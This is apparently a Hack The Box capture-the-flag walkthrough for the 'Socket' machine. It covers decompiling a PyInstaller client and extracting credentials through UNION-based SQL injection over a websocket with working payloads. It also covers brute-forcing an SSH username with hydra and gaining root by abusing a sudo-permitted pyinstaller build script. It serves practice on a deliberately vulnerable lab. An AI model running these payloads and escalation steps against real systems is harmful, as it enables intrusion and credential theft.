# Socket

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.71.152    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-27 00:57 EDT
Nmap scan report for 10.129.71.152
Host is up (0.17s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
5789/tcp  open     unknown
```

We have to add `qreader.htb` to our `/etc/hosts` file. I ran a detailed scan on port 80 and found it is a Python based server:

```
80/tcp open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
```

### Qreader

Website presents some kind of QR Code maker / reader application:

<figure><img src="../../.gitbook/assets/image (1411).png" alt=""><figcaption></figcaption></figure>

We can actually download the application below and view the source code:

<figure><img src="../../.gitbook/assets/image (2831).png" alt=""><figcaption></figcaption></figure>



Additionally, we can submit a report when something goes wrong:

<figure><img src="../../.gitbook/assets/image (938).png" alt=""><figcaption></figcaption></figure>

Interesting. When we download the file, we will get a binary and a test image:

```
┌──(kali㉿kali)-[~/htb/season/socket/app]
└─$ ls    
qreader  test.png
                                                                                             
┌──(kali㉿kali)-[~/htb/season/socket/app]
└─$ file qreader 
qreader: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3f71fafa6e2e915b9bed491dd97e1bab785158de, for GNU/Linux 2.6.32, stripped
```

We can try to reverse engineer this application. I tried with `ghidra` but it produced a lot of code that I could not read. Instead, we need to use Python Decompilation as the web server runs the application in Python based on the earlier `nmap` scan of port 80.&#x20;

We can decompile this using `pyi-archive_viwer qreader`, and then convert it into a pyc file via `uncompyle6`. Then, we can do source code analysis of the app.&#x20;

### Websocket SQL Injection

When reading the source code, we come across this:

{% code overflow="wrap" %}
```python
def version(self):
    response = asyncio.run(ws_connect(ws_host + '/version', json.dumps({
        'version': VERSION })))
    data = json.loads(response)
    if 'error' not in data.keys():
        version_info = data['message']
        msg = f'''[INFO] You have version {version_info['version']} which was released on {version_info['released_date']}'''
        self.statusBar().showMessage(msg)
        return None
    error = None['error']
    self.statusBar().showMessage(error)
```
{% endcode %}

This connects to a websocket, which is on port 5789 after running an `nmap` scan to confirm. It appears to send some information via `ws_connect` to the `/version` directory.&#x20;

```
5789/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Date: Mon, 27 Mar 2023 05:02:03 GMT
|     Server: Python/3.10 websockets/10.4
|     Content-Length: 77
|     Content-Type: text/plain
|     Connection: close
|     Failed to open a WebSocket connection: did not receive a valid HTTP request.
```

We can make a script to communicate with this port via `websocket` and send a JSON object for the version as per the script above.

```python
from websocket import create_connection
import sys, json

ws_host = 'ws://qreader.htb:5789'

VERSION = '0.0.2'

ws = create_connection(ws_host + '/version')
ws.send(json.dumps({'version': VERSION}))
result = ws.recv()
print(result)
ws.close()
```

The output is as shown:

{% code overflow="wrap" %}
```
$ python3 exploit.py
{"message": {"id": 2, "version": "0.0.2", "released_date": "26/09/2022", "downloads": 720}}
```
{% endcode %}

I tried playing around with the version number, and it would raise an `Invalid Version!` error each time it wasn't set to `0.0.2`. When I appended a `"`, it would print nothing, indicating that there was an error in the backend since the code catches errors.&#x20;

I played around with some UNION SQL injection, and found that the payload of `0.0.2"UNION SELECT 1,2,3,4;-- -` generated **no errors.** Changing the number of columns results in an error, indicating that this application is indeed vulnerable to SQL Injection.&#x20;

We can confirm the DBMS used by trying different version commands, and I found that `sqlite_version()` works.

```
$ python3 exploit.py
{"message": {"id": "3.37.2", "version": 2, "released_date": 3, "downloads": 4}}
```

With this, we can extract the tables present in `sqlite_schema`.

{% code overflow="wrap" %}
```
{"message": {"id": "sqlite_sequence,versions,users,info,reports,answers", "version": 2, "released_date": 3, "downloads": 4}}
```
{% endcode %}

There's a `users` table, and we can try to extract a username and password from it.&#x20;

{% code overflow="wrap" %}
```
payload used: 0.0.2"UNION SELECT username,password,3,4 from users;-- -
{"message": {"id": "admin", "version": "0c090c365fa0559b151a43e0fea39710", "released_date": 3, "downloads": 4}}
```
{% endcode %}

Great! The hash can be cracked on crackstation:

<figure><img src="../../.gitbook/assets/image (3225).png" alt=""><figcaption></figcaption></figure>

Now, we need to find a username. I looked through the other tables of `reports` and `answers`.&#x20;

{% code overflow="wrap" %}
```
{"message": {"id": "Hello Json,\n\nAs if now we support PNG formart only. We will be adding JPEG/SVG file formats in our next version.\n\nThomas Keller,Hello Mike,\n\n We have confirmed a valid problem with handling non-ascii charaters. So we suggest you to stick with ascci printable characters for now!\n\nThomas Keller", "version": 2, "released_date": 3, "downloads": 4}}
```
{% endcode %}

This was done using `group_concat(answers)`, and it seems that the user is either Mike, Thomas Keller or Json. I tested `ssh` with a wordlist of possible usernames generated from their names, and found that `tkeller` is the right user via `hydra`.

We can then `ssh` in as `tkeller` and grab the user flag.

<figure><img src="../../.gitbook/assets/image (4023).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Sudo Pyinstaller

Checking the `sudo` privileges we have, I found that we can run bash script as `root`.

```
tkeller@socket:~$ sudo -l
Matching Defaults entries for tkeller on socket:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tkeller may run the following commands on socket:
    (ALL : ALL) NOPASSWD: /usr/local/sbin/build-installer.sh
```

Here's the contents of that script:

```bash
#!/bin/bash
if [ $# -ne 2 ] && [[ $1 != 'cleanup' ]]; then
  /usr/bin/echo "No enough arguments supplied"
  exit 1;
fi

action=$1
name=$2
ext=$(/usr/bin/echo $2 |/usr/bin/awk -F'.' '{ print $(NF) }')

if [[ -L $name ]];then
  /usr/bin/echo 'Symlinks are not allowed'
  exit 1;
fi

if [[ $action == 'build' ]]; then
  if [[ $ext == 'spec' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /home/svc/.local/bin/pyinstaller $name
    /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'make' ]]; then
  if [[ $ext == 'py' ]] ; then
    /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
    /root/.local/bin/pyinstaller -F --name "qreader" $name --specpath /tmp
   /usr/bin/mv ./dist ./build /opt/shared
  else
    echo "Invalid file format"
    exit 1;
  fi
elif [[ $action == 'cleanup' ]]; then
  /usr/bin/rm -r ./build ./dist 2>/dev/null
  /usr/bin/rm -r /opt/shared/build /opt/shared/dist 2>/dev/null
  /usr/bin/rm /tmp/qreader* 2>/dev/null
else
  /usr/bin/echo 'Invalid action'
  exit 1;
fi
```

So this script checks for a `.spec` file extension, and takes an `$action` argument from us. It appears that the `build` option runs `pyinstaller` on the file we choose. What `pyinstaller` does is just run the code we specify.&#x20;

As such, the exploit is simple.&#x20;

<figure><img src="../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

Pretty straightforward machine. The hard part was the SQL injection.&#x20;
